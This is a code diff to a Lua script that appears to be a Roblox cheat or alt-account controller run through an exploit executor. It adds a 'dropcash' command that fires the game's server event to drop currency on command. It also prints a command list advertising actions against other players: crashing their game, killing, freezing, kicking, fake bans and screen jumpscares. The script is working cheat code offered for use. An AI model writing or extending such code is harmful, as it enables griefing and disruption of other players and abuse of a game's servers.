@@ -195,6 +195,25 @@ spawn(function()
                 end
             end
     
+            if args[1] == prefix .. 'dropcash' then
+                function dropCash()
+                    if game.Players.LocalPlayer.DataFolder.Currency.Value >=10000 then
+                        game.ReplicatedStorage.MainEvent:FireServer('DropMoney', 10000)
+                    else
+                        game.ReplicatedStorage.MainEvent:FireServer('DropMoney', game.Players.LocalPlayer.DataFolder.Currency.Value)
+                    end
+                end
+                if args[2] == prefix2 then
+                    dropCash()
+                else
+                    findPlayer(args[2], function(plr)
+                        if plr.Name == NormalUser.Name then
+                            dropCash()
+                        end
+                    end)
+                end
+            end
+
             -- Benx command
             if args[1] == prefix .. 'benx' then
                 function benx()
@@ -387,8 +406,30 @@ spawn(function()
     wait(1)
     if IsAMod == false then
         getgenv().Rank = 'Normal rank'
+        game.StarterGui:SetCore("SendNotification", {
+            Title = 'Hello ' .. game.Players.LocalPlayer.DisplayName;
+            Text = 'Your rank: '.. getgenv().Rank
+        })
     else
         getgenv().Rank = 'Premium'
+        game.StarterGui:SetCore("SendNotification", {
+            Title = 'Hello ' .. game.Players.LocalPlayer.DisplayName;
+            Text = 'Your rank: '.. getgenv().Rank..', Press "F9" To view all commands!';
+        })
     end
-    
+    print('Hello ' .. game.Players.LocalPlayer.DisplayName..'!')
+    print'Your commands:'
+    print('!bring < /player> -- Bring player')
+    print('!benx < /player> -- Benx player')
+    print('!kill < /player> -- Kill player')
+    print('!crash < /player> -- Crash game of player')
+    print('!refresh < /player> -- Refresh player')
+    print('!freeze < /player> -- Freeze player')
+    print('!thaw < /player> -- UnFreeze player')
+    print('!ban < /player> -- Fake ban')
+    print('!kick < /player> -- Kick player of game')
+    print('!flash < /player> -- Flash on player screen')
+    print('!unflash < /player> -- UnFlash on player screen')
+    print('!jumpscare < /player> -- Jumpscare on player screen')
+    print('!dropmoney < /player> -- The player drop 7 k')
 end)
